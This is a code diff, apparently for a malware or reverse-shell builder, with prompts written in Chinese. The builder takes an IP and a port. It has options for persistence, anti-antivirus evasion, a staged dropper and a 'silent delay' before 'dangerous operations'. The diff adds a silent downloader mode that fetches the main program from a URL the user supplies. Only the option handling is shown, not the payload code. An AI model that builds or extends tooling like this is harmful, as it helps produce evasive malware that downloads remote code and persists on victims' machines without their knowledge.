@@ -49,6 +49,20 @@ def interactive_mode():
     anti_detection = input("添加反杀毒特征? (Y/n) >>> ").strip().lower() != 'n'
     use_dropper = input("使用分阶段执行模式? (Y/n) >>> ").strip().lower() != 'n'
     
+    # 新增：下载器选项
+    use_downloader = input("生成下载器模式? (y/N) >>> ").strip().lower() == 'y'
+    download_url = None
+    downloader_silent = False
+    
+    if use_downloader:
+        while True:
+            download_url = input("下载地址 (主程序URL) >>> ").strip()
+            if download_url and (download_url.startswith('http://') or download_url.startswith('https://')):
+                break
+            print("❌ 请输入有效的HTTP/HTTPS URL")
+        
+        downloader_silent = input("下载器静默模式? (Y/n) >>> ").strip().lower() != 'n'
+    
     return {
         'ip': ip,
         'port': port,
@@ -59,7 +73,10 @@ def interactive_mode():
         'filename': custom_filename,
         'persistence': add_persistence,
         'anti_detection': anti_detection,
-        'use_dropper': use_dropper
+        'use_dropper': use_dropper,
+        'use_downloader': use_downloader,
+        'download_url': download_url,
+        'downloader_silent': downloader_silent
     }
 
 
@@ -76,6 +93,9 @@ def command_line_mode():
     parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
     parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
     parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
+    parser.add_argument('--use-downloader', action='store_true', help='生成下载器模式')
+    parser.add_argument('--download-url', help='下载地址 (主程序URL)')
+    parser.add_argument('--downloader-silent', action='store_true', help='下载器静默模式')
     parser.add_argument('--quiet', action='store_true', help='静默模式')
     parser.add_argument('--silent-delay', default=30, type=int, help='静默延迟时间（秒），在执行危险操作前等待')
     
